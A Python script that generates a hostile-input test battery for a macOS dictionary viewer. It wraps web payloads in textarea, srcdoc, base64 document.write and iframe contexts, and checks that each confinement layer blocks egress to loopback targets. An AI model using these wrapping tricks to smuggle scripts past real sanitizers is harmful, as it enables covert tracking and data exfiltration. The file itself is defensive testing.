# What `ok-xdict` must show with no page script: each image drawn, the sheet applied, the recording playable.
OK_PROBE = ("var r=[],q=function(s){return document.querySelector(s)};"
            "var i=q('img[src$=\"ok.svg\"]');if(i&&i.complete&&i.naturalWidth>0)r.push(['ok','img']);"
            "var j=q('img[src^=\"data:\"]');if(j&&j.complete&&j.naturalWidth>0)r.push(['ok','data-img']);"
            "var l=q('link[href$=\"ok.css\"]');if(l&&l.sheet)r.push(['ok','css']);"
            "var u=q('audio');if(u&&u.readyState>=3)r.push(['ok','audio']);return r")


# The contexts a wrapped payload is repeated in (`wrap=True`), each its own case `<payload>~<context>`.
def contextual(context: str, page: str, resources: dict, c: Ctx) -> tuple:
    if context == "textarea":
        return textarea(page), resources
    if context == "srcdoc":
        return srcdoc(page), resources
    if context == "write":
        encoded = base64.b64encode(page.encode("ascii")).decode()
        return f'<script>document.write(atob("{encoded}"))</script>', resources
    if context == "resource":
        return f'<iframe src="{c.r("doc.html")}" width="300" height="150"></iframe>', {**resources, "doc.html": textarea(page)}
    raise ValueError(context)


CONTEXTS = ["textarea", "srcdoc", "write", "resource"]


# Elements whose text the HTML tokenizer reads raw, to their own end tag: a browser's (WHATWG raw text and RCDATA), and
# the core's tag scanner's, which reads `<!--` inside a `<textarea>` as a comment (`textarea()`).
BROWSER_RAW = ("script", "style", "textarea", "title", "xmp", "iframe", "noembed", "noframes")
CORE_RAW = ("script", "style")
TAG = re.compile(r"""<([a-z][a-z0-9-]*)(?:[^>"']|"[^"]*"|'[^']*')*>""")


def script_elements(page: str, raw: tuple = BROWSER_RAW) -> int:
    """Script elements as an HTML tokenizer builds them, not `<script` substrings: a `<script` inside a script's text,
    a comment or a quoted attribute is no element (2026-10-16: the core writes a kept script's `<script` as
    `\\x3Cscript`, the same string, which a substring count read as a script stripped)."""
    lower, count, at = page.lower(), 0, 0
    while (lt := lower.find("<", at)) >= 0:
        if lower.startswith("<!--", lt):
            end = lower.find("-->", lt + 4)
            if end < 0:
                return count
            at = end + 3
            continue
        tag = TAG.match(lower, lt)
        if not tag:
            at = lt + 1
            continue
        name, at = tag.group(1), tag.end()
        count += name == "script"
        if name in raw:
            close = lower.find("</" + name, at)
            if close < 0:
                return count
            at = close
    return count


def visible_scripts(page: str) -> int:
    """Script elements the core reads as markup: those behind `textarea()`'s comment it reads as a comment, which a
    normalized entry drops whole (S2), so they are never served whatever the strip does."""
    return script_elements(page, CORE_RAW)


def cases() -> list[dict]:
    out: list[dict] = []
    for (pid, group, build, wait, wrap, probe) in payloads():
        for context in [None] + (CONTEXTS if wrap else []):
            cid = pid if context is None else f"{pid}~{context}"
            c = Ctx(cid, len(out))
            page, resources = build(c)
            if context is not None:
                page, resources = contextual(context, page, resources, c)
            out.append({"id": cid, "payload": pid, "context": context or "byte-zero", "group": group, "wait": wait,
                        "tcp": c.tcp, "udp": c.udp, "exclusive": group == "webrtc", "names": c.names,
                        "probe": probe, "scripts": script_elements(page),
                        "scriptsVisible": visible_scripts(page),
                        "record": page, "resources": resources})
    assert len(out) < CONTROL["udp"] - TCP0, "the TCP ports would reach the control ports"
    ids = [c["id"] for c in out]
    assert len(ids) == len(set(ids)), "duplicate case id"
    for c in out:
        assert c["record"].isascii(), c["id"]
    return out


# **The isolated per-layer controls** (plan-macos-v1 WI-4): each run is named by the layers left ON (`--disable-layer`
# turns the rest off), and each layer's probes must leave in `baseline` and be refused in its run. `link-preconnect`
# is measured beside the navigation table, as spike 3 did (its control is `nav`): without the table the navigation
# itself leaves, and the preconnect could not be told from it.
# `strip` is the core's whole strip list (S1–S14 and its script rules), not the view's: off in every run but `strip` and `production`,
# so each of the view's layers is proven against live scripts (the rewriter is compatibility, not the boundary), and
# `shell` is production with only the strip off: the view's whole confinement, holding against every live script.
LAYERS = ["csp", "rules", "nav", "popups", "link-preconnect", "peer-connection", "strip"]
VIEW_LAYERS = [layer for layer in LAYERS if layer != "strip"]
RUNS = {
    "baseline": [],
    "csp": ["csp"],
    "rules": ["rules"],
    "nav": ["nav"],
    "popups": ["popups"],
    "nav+link-preconnect": ["nav", "link-preconnect"],
    "peer-connection": ["peer-connection"],
    "strip": ["strip"],
    "shell": VIEW_LAYERS,
    "production": LAYERS,
}
# The runs `hostile.production` holds to zero; the rest are `hostile.controls`.
PRODUCTION_PART = ["shell", "production"]
PROBES = {
    # The policy header: a connection, a srcdoc document's fetch (inherited), an SVG document under r/ navigated to
    # (the case a shell-written <meta> missed in spike 3), a worker, and markup the rewriter could not see.
    "csp": {"run": "csp", "against": "baseline",
            "cases": ["fetch", "iframe-srcdoc-fetch", "nav-svg-doc", "worker-blob", "img~textarea"]},
    "rules": {"run": "rules", "against": "baseline", "cases": ["fetch", "img~textarea", "dns-prefetch~textarea"]},
    "nav": {"run": "nav", "against": "baseline", "cases": ["nav-location", "meta-refresh~textarea", "iframe-srcdoc-top"]},
    "popups": {"run": "popups", "against": "baseline", "cases": ["window-open-blank-write"]},
    "link-preconnect": {"run": "nav+link-preconnect", "against": "nav",
                        "cases": ["anchor-detached", "anchor-click~textarea"]},
    "peer-connection": {"run": "peer-connection", "against": "baseline", "cases": ["rtc-stun", "rtc-turn"]},
    # The core's strip: an inline script's fetch, location and worker, which the core can see, go with their script.
    "strip": {"run": "strip", "against": "baseline", "cases": ["fetch", "nav-location", "worker-blob"]},
}


def reader_entry(index: int) -> tuple:
    """The entry a person's hands are tested on (reader-driven egress, ADR-0009 refutation item 8): links and images
    of every kind, for clicks with each modifier, hover, the context menu, downloads and drags."""
    c = Ctx("reader", index)
    page = (
        '<p id="text">Selectable text of the reader entry: run, ran, running.</p>'
        f'<p><a id="link-remote" href="https://{c.name("rl")}:{c.tcp}/x">a remote link</a></p>'
        f'<p><a id="link-ip" href="http://127.0.0.1:{c.tcp}/{TOKEN}/reader/ip">a link to an address</a></p>'
        f'<p><a id="link-download" download="x.bin" href="http://127.0.0.1:{c.tcp}/{TOKEN}/reader/download.bin">'
        'a remote download</a></p>'
        f'<p><a id="link-resource-download" download="file.txt" href="{c.r("file.txt")}">a resource download</a></p>'
        f'<p><a id="link-entry" href="entry://ok-xdict">another entry</a></p>'
        f'<p><img id="img-remote" src="https://{c.name("ri")}:{c.tcp}/x.png" width="160" height="28"></p>'
        f'<p><a id="link-image" href="http://127.0.0.1:{c.tcp}/{TOKEN}/reader/wrapped">'
        f'<img id="img-in-link" src="{c.r("pic.bmp")}" width="40" height="40"></a></p>'
        f'<p><img id="img-local" src="{c.r("pic.svg")}" width="60" height="60"></p>'
        f'<p><img id="img-data" src="data:image/png;base64,{PNG}" width="60" height="60"></p>'
        f'<p><img id="img-raster" src="{c.r("pic.bmp")}" width="60" height="60"></p>'
    )
    return c, page, {"file.txt": "a resource answered whole, never as an attachment",
                     "pic.svg": OK_SVG, "pic.bmp": bmp()}


def build() -> tuple[str, str]:
    all_cases = cases()
    reader, reader_page, reader_resources = reader_entry(len(all_cases))
    entries = [[c["id"], c["record"]] for c in all_cases] + [["reader", reader_page],
                                                             ["landing", "<p>landing</p>"]]
    mdd = []
    for c in all_cases + [{"id": "reader", "resources": reader_resources}]:
        for leaf, body in sorted(c["resources"].items()):
            mdd.append([f"\\{c['id']}\\{leaf}", body])
    dictionary = {
        "comment": "The hostile-input battery (apps/apple/Tools/hostile/battery.py writes this file; do not edit by "
                   "hand): one egress attempt per entry, every target on this Mac's loopback or under .invalid. Our "
                   "own text, no dictionary content.",
        "mdx": {"name": "hostile.mdx", "title": "Hostile", "entries": entries},
        "mdd": [{"name": "hostile.mdd", "entries": mdd}],
        "sidecars": [],
    }
    known = {c["id"] for c in all_cases}
    for layer, probe in PROBES.items():
        missing = set(probe["cases"]) - known
        assert not missing, f"{layer}: no case {sorted(missing)}"
        assert probe["run"] in RUNS and probe["against"] in RUNS, layer
    listed = {
        "comment": "What the hostile stage runs and what it holds each run to (apps/apple/Tools/hostile/battery.py).",
        "token": TOKEN, "control": CONTROL, "selftestName": f"selftest-{TOKEN}.invalid",
        "layers": LAYERS, "runs": RUNS, "productionPart": PRODUCTION_PART, "probes": PROBES,
        "reader": {"tcp": reader.tcp, "udp": reader.udp, "names": reader.names},
        "cases": [{k: v for k, v in c.items() if k not in ("record", "resources")} for c in all_cases],
    }
    dump = lambda value: json.dumps(value, indent=1, ensure_ascii=True, sort_keys=False) + "\n"
    return dump(dictionary), dump(listed)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--check", action="store_true", help="exit 1 if the files on disk are not what this writes")
    a = ap.parse_args()
    dictionary, listed = build()
    paths = {os.path.join(FIXTURE, "dictionary.json"): dictionary, os.path.join(FIXTURE, "cases.json"): listed}
    if a.check:
        stale = [p for p, text in paths.items() if not os.path.exists(p) or open(p, encoding="utf-8").read() != text]
        if stale:
            print(f"battery: stale, run apps/apple/Tools/hostile/battery.py: {stale}", file=sys.stderr)
            return 1
        print(f"battery: {FIXTURE} is current")
        return 0
    os.makedirs(FIXTURE, exist_ok=True)
    for path, text in paths.items():
        with open(path + ".tmp", "w", encoding="utf-8") as f:
            f.write(text)
        os.replace(path + ".tmp", path)
    count = len(json.loads(listed)["cases"])
    print(f"battery: {count} cases and the reader entry in {FIXTURE}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
